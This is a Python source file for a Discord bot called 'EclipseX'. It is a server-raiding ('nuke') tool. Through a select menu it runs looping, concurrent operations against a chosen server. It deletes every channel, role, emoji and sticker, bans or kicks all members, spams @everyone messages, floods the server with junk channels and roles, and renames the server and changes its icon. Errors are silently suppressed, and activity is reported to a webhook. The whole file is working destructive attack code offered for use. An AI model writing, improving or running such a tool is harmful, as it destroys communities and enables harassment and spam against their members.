import discord
from discord import Interaction, SyncWebhook
from discord.ui import View, Select, Button
import asyncio
from . import *
import datetime

##########SelectGuild##########

class SelectGuildView(View):
    def __init__(self, guild):
        super().__init__(timeout=60)
        self.add_item(GuildSelect(guild))

class GuildSelect(Select):
    def __init__(self, guild):
        options = [
            discord.SelectOption(label=guild.name, value=str(guild.id)) for guild in guild
        ]
        super().__init__(placeholder="Select Guild", options=options)

    async def callback(self, interaction: Interaction):
        if not helper.IsUserInAdmin(userid=str(interaction.user.id)):
            embed = discord.Embed(
                description="You cannot use this command.",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        config = helper.LoadConfig()
        sendLogs = config.get("SendLogs", False)
        guildId = int(self.values[0])  
        
        targetGuild = discord.utils.get(interaction.client.guilds, id=guildId)
        
        if targetGuild:
            embed = discord.Embed(
                title="Select Operation",
                description=f"- **Target Name**: `{targetGuild.name}`\n- **Target ID**: `{targetGuild.id}`",
                color=discord.Color.blue()
            )
            selectedGuild = targetGuild.id
            view = SelectOperationView(selectedGuild)
            await interaction.response.edit_message(embed=embed, view=view)
        else:
            embed = discord.Embed(
                description="Guild not found.",
                color=discord.Color.red()
            )
            await interaction.response.edit_message(embed=embed)

        if sendLogs == False:
            pass
        else:
            try:
                logWebhook = SyncWebhook.from_url(config.get("LogWebhook", ""))
                if logWebhook:
                    guild = interaction.client.get_guild(guildId)
                    if guild:
                        embed = discord.Embed(
                            title="Guild Selected",
                            description=f"- **Name**: `{guild.name}`\n- **ID**: `{guild.id}`",
                            color=discord.Color.blue()
                        )
                        try:
                            logWebhook.send(embed=embed, username="EclipseX", avatar_url="https://ibb.co/4ZtfJJJ3")
                        except:
                            pass
            except:
                pass

##########SelectOperation##########

class SelectOperationView(View):
    def __init__(self, selectedGuild):
        super().__init__(timeout=60)
        self.add_item(OperationSelect(selectedGuild))

class OperationSelect(Select):
    def __init__(self, selectedGuild):
        self.operationLabels = {
            "DCCT": "Delete Channel And Category",
            "SendMessage": "Send Message",
            "DR": "Delete Role",
            "DE": "Delete Emoji",
            "DS": "Delete Sticker",
            "MB": "Member Ban",
            "MK": "Member Kick",
            "CCT": "Create Category",
            "CC": "Create Channel",
            "CR": "Create Role",
            "CIN": "Change Icon And Name"
        }
        
        options = [
            discord.SelectOption(label=self.operationLabels["DCCT"], value="DCCT"),
            discord.SelectOption(label=self.operationLabels["SendMessage"], value="SendMessage"),
            discord.SelectOption(label=self.operationLabels["DR"], value="DR"),
            discord.SelectOption(label=self.operationLabels["DE"], value="DE"),
            discord.SelectOption(label=self.operationLabels["DS"], value="DS"),
            discord.SelectOption(label=self.operationLabels["MB"], value="MB"),
            discord.SelectOption(label=self.operationLabels["MK"], value="MK"),
            discord.SelectOption(label=self.operationLabels["CCT"], value="CCT"),
            discord.SelectOption(label=self.operationLabels["CC"], value="CC"),
            discord.SelectOption(label=self.operationLabels["CR"], value="CR"),
            discord.SelectOption(label=self.operationLabels["CIN"], value="CIN")
        ]
        self.guild = selectedGuild
        self.running = False
        super().__init__(placeholder="Select Operation", options=options)

    async def callback(self, interaction: discord.Interaction):
        if not helper.IsUserInAdmin(userid=str(interaction.user.id)):
            embed = discord.Embed(
                description="You cannot use this command.",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        operation = self.values[0]
        sendLogs = helper.LoadConfig().get("SendLogs", False)
        logWebhook = helper.LoadConfig().get("LogWebhook", "")

        stopButton = Button(style=discord.ButtonStyle.danger, label="Stop", custom_id="stop")
        self.startTime = datetime.datetime.now()
        
        async def stopCallback(interaction):
            if not helper.IsUserInAdmin(userid=str(interaction.user.id)):
                embed = discord.Embed(
                    description="You cannot use this command.",
                    color=discord.Color.red()
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return

            if self.running == False:
                embed = discord.Embed(
                    description="**The operation is already stopped.**",
                    color=discord.Color.red()
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
            
            endTime = datetime.datetime.now()
            operationDuration = endTime - self.startTime
            durationStr = str(operationDuration).split('.')[0] 
            
            if sendLogs == False:
                pass
            else:
                try:
                    logWebhook = helper.LoadConfig().get("LogWebhook", "")
                    logWebhook = SyncWebhook.from_url(logWebhook)
                    if logWebhook:
                        guild = interaction.client.get_guild(self.guild)
                        if guild:
                            embed = discord.Embed(
                                title="Operation Stopped",
                                description=f"- **Guild**: `{guild.name}`\n- **Guild ID**: `{guild.id}`\n- **Operation**: `{self.operationLabels[operation]}`\n- **Duration**: `{durationStr}`",
                                color=discord.Color.red()
                            )
                            try:
                                logWebhook.send(embed=embed, username="EclipseX", avatar_url="https://ibb.co/4ZtfJJJ3")
                            except:
                                pass
                except:
                    pass
            
            self.running = False
            embed = discord.Embed(
                description=f"- **Stopping the operation**\n- **Duration**: `{durationStr}`",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        
        stopButton.callback = stopCallback
        
        view = View()
        view.add_item(stopButton)
        
        embed = discord.Embed(
            description=f"- **Click the Stop button to stop the operation**\n\n- **Operation**: `{self.operationLabels[operation]}`",
            color=discord.Color.blue()
        )
        await interaction.response.send_message(embed=embed, view=view)
        
        self.running = True

        if sendLogs == False:
            pass
        else:
            try:
                logWebhook = SyncWebhook.from_url(logWebhook)
                if logWebhook:
                    guild = interaction.client.get_guild(self.guild)
                    if guild:
                        embed = discord.Embed(
                            title="Operation Started",
                            description=f"- **Guild**: `{guild.name}`\n- **Guild ID**: `{guild.id}`\n- **Operation**: `{self.operationLabels[operation]}`",
                            color=discord.Color.blue()
                        )
                        try:
                            logWebhook.send(embed=embed, username="EclipseX", avatar_url="https://ibb.co/4ZtfJJJ3")
                        except:
                            pass
            except:
                pass

        self.operations = {
            "DCCT": self.DeleteChannelAndCategory,
            "SendMessage": self.SendMessage,
            "DR": self.DeleteRole,
            "DE": self.DeleteEmoji,
            "DS": self.DeleteSticker,
            "MB": self.BanMember,
            "MK": self.KickMember,
            "CCT": self.CreateCategory,
            "CC": self.CreateChannel,
            "CR": self.CreateRole,
            "CIN": self.ChangeIconAndName
        }

        if operation in self.operations:
            await self.operations[operation](interaction)

    async def DeleteChannelAndCategory(self, interaction):
        try:
            gid = self.guild
            g = interaction.client.get_guild(gid)
            if g:
                tasks = [self.DeleteChannelTask(channel) for channel in g.channels if channel.id != interaction.channel_id]
                await asyncio.gather(*tasks)
        except:
            pass

    async def SendMessage(self, interaction):
        try:
            gid = self.guild
            g = interaction.client.get_guild(gid)
            if g:
                config = helper.LoadConfig()
                messages = config.get("Messages", [])
                if messages:
                    tasks = [self.SendMessageToChannelTask(channel, messages) for channel in g.text_channels]
                    await asyncio.gather(*tasks)
        except:
            pass

    async def DeleteRole(self, interaction):
        try:
            gid = self.guild
            g = interaction.client.get_guild(gid)
            if g:
                tasks = [self.DeleteRoleTask(role) for role in g.roles if role.name != "@everyone"]
                await asyncio.gather(*tasks)
        except:
            pass

    async def DeleteEmoji(self, interaction):
        try:
            gid = self.guild
            g = interaction.client.get_guild(gid)
            if g:
                tasks = [self.DeleteEmojiTask(emoji) for emoji in g.emojis]
                await asyncio.gather(*tasks)
        except:
            pass

    async def DeleteSticker(self, interaction):
        try:
            gid = self.guild
            g = interaction.client.get_guild(gid)
            if g:
                tasks = [self.DeleteStickerTask(sticker) for sticker in g.stickers]
                await asyncio.gather(*tasks)
        except:
            pass

    async def BanMember(self, interaction):
        try:
            gid = self.guild
            g = interaction.client.get_guild(gid)
            if g:
                tasks = [self.BanMemberTask(member) for member in g.members]
                await asyncio.gather(*tasks)
        except:
            pass

    async def KickMember(self, interaction):
        try:
            gid = self.guild
            g = interaction.client.get_guild(gid)
            if g:
                tasks = [self.KickMemberTask(member) for member in g.members]
                await asyncio.gather(*tasks)
        except:
            pass

    async def CreateCategory(self, interaction):
        try:
            gid = self.guild
            g = interaction.client.get_guild(gid)
            config = helper.LoadConfig()
            names = config.get("CategoryName", [])
            if g:
                tasks = [self.CreateCategoryTask(names, g)]
                await asyncio.gather(*tasks)
        except:
            pass

    async def CreateChannel(self, interaction):
        try:
            gid = self.guild
            g = interaction.client.get_guild(gid)
            if g:
                config = helper.LoadConfig()
                names = config.get("ChannelName", [])
                tasks = [self.CreateChannelTask(names, g)]
                await asyncio.gather(*tasks)
        except:
            pass

    async def CreateRole(self, interaction):
        try:
            gid = self.guild
            g = interaction.client.get_guild(gid)
            config = helper.LoadConfig()
            names = config.get("RoleName", [])
            if g:
                tasks = [self.CreateRoleTask(names, g)]
                await asyncio.gather(*tasks)
        except:
            pass

    async def ChangeIconAndName(self, interaction):
        try:
            gid = self.guild
            g = interaction.client.get_guild(gid)
            if g:
                config = helper.LoadConfig()
                name = config.get("GuildName")
                with open("no1jj/icon.png", "rb") as f:
                    icon = f.read()
                await g.edit(name=name, icon=icon)
        except:
            pass

    async def DeleteChannelTask(self, channel):
        try:
            while self.running:
                if channel:
                    await channel.delete()
                else:
                    break
        except:
            pass

    async def SendMessageToChannelTask(self, channel, messages):
        try:
            while self.running:
                config = helper.LoadConfig()
                sendEveryone = config.get("SendEveryone", True)
                
                message = helper.RandomMessage(messages)
                if sendEveryone:
                    message += " @everyone"
                    
                await channel.send(message)
        except:
            pass

    async def DeleteRoleTask(self, role):
        try:
            while self.running:
                if role:
                    await role.delete()
                else:
                    break
        except:
            pass

    async def DeleteEmojiTask(self, emoji):
        try:
            while self.running:
                if emoji:
                    await emoji.delete()
                else:
                    break
        except:
            pass

    async def DeleteStickerTask(self, sticker):
        try:
            while self.running:
                if sticker:
                    await sticker.delete()
                else:
                    break
        except:
            pass

    async def BanMemberTask(self, member):
        try:
            while self.running:
                if member:
                    await member.ban()
                else:
                    break
        except:
            pass

    async def KickMemberTask(self, member):
        try:
            while self.running:
                if member:
                    await member.kick()
                else:
                    break
        except:
            pass

    async def CreateCategoryTask(self, names, guild):
        try:
            while self.running:
                await guild.create_category(name=helper.RandomChannelName(names))
        except:
            pass

    async def CreateChannelTask(self, names, guild):
        try:
            while self.running:
                await guild.create_text_channel(name=helper.RandomChannelName(names))
        except:
            pass

    async def CreateRoleTask(self, names, guild):
        try:
            while self.running:
                await guild.create_role(name=helper.RandomRoleName(names))
        except:
            pass

# Made by no.1_jj
# v1.0.2